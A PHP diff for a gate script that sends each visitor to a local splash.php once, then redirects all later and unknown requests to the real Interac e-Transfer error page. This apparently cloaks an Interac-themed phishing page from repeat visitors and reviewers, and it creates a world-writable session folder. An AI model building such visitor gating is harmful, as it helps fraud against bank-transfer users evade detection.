@@ -1,25 +1,39 @@
 <?php
+// Prevent accidental output before headers
+ob_start();
+
+// --- Force writable session directory ---
+$session_path = __DIR__ . '/sessions';
+if (!is_dir($session_path)) {
+    mkdir($session_path, 0777, true);
+}
+ini_set('session.save_path', $session_path);
+
+// --- Start session safely ---
 session_start();
 
-// --- Define the Interac error URL ---
+// --- Interac error URL ---
 define('ERROR_URL', 'https://etransfer.interac.ca/error');
 
-// --- First visit check ---
-if (!isset($_SESSION['visited'])) {
+// --- First time visitor? ---
+if (empty($_SESSION['visited'])) {
     $_SESSION['visited'] = true;
     header('Location: splash.php');
     exit;
 }
 
-// --- If file requested does not exist, redirect ---
-$request_uri = $_SERVER['REQUEST_URI'];
-$requested_file = $_SERVER['DOCUMENT_ROOT'] . parse_url($request_uri, PHP_URL_PATH);
+// --- Requested file check ---
+$request     = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+$full_path   = $_SERVER['DOCUMENT_ROOT'] . $request;
 
-if (!file_exists($requested_file) || is_dir($requested_file)) {
-    header('Location: ' . ERROR_URL);
+if (!file_exists($full_path) || is_dir($full_path)) {
+    header("Location: " . ERROR_URL);
     exit;
 }
 
-// --- All subsequent visits ---
-header('Location: ' . ERROR_URL);
+// --- All other traffic ---
+header("Location: " . ERROR_URL);
 exit;
+
+// End output buffer cleanly
+ob_end_flush();
